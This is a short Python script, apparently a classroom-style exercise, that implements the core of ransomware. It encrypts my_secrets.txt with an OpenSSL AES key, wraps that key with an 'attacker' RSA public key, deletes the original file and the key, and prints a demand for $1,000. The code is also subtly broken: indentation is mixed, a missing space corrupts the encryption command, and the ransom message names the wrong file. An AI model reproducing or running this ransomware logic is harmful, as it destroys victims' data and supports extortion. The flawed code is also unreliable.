import subprocess
import os
import base64

def run_cmd(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Command failed: {cmd}")
        print("Error:", result.stderr)
        exit(1)
    return result.stdout.strip()

def main():
    # 1. Generate 16-byte symmetric key in base64 and save to key.txt
    print("Generating symmetric key...")
    key = run_cmd("openssl rand -base64 16")
    with open("key.txt", "w") as f:
        f.write(key + "\n")

    # 2. Generate attacker RSA public/private keys (2048 bits)
	run_cmd("openssl genrsa -out private.pem 2048")
	run_cmd("openssl rsa -in private.pem -pubout -out public.pem")

    # 3. Encrypt my_secrets.txt with the symmetric key using AES-128-CBC
    # Decode base64 key to hex first so that OpenSSL can iuse it:
    key_bytes = base64.b64decode(key)
    key_hex = key_bytes.hex()

    # using a fixed iv for simpliciyt
    iv = "00000000000000000000000000000000"

    # Encrypt file using openssl enc with key and iv in hex
    # Output base64 encoded cipher text to data_cipher.txt
    encrypt_cmd = (
        f"openssl enc -aes-128-cbc -K {key_hex} -iv {iv} -in my_secrets.txt"
        f"-base64 -out data_cipher.txt"
    )
    run_cmd(encrypt_cmd)

    # 4) Encrypt key.txt with the attacker's public key (RSA encryption)
    # encrypt key.txt to binary, then binary to text
    run_cmd("openssl rsautl -encrypt -pubin -inkey public.pem -in key.txt -out key_cipher.bin")
    run_cmd("openssl base64 -in key_cipher.bin -out key_cipher.txt")
    # remove intermediate binary
    os.remove("key_cipher.bin")

    # 5, 6. Delete key.txt and my_secrets.txt
    os.remove("key.txt")
    os.remove("my_secrets.txt")

    # 7. Display ransom message
    print("\nYour file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send key_cipher.txt to me.")

if __name__ == "__main__":
    main()
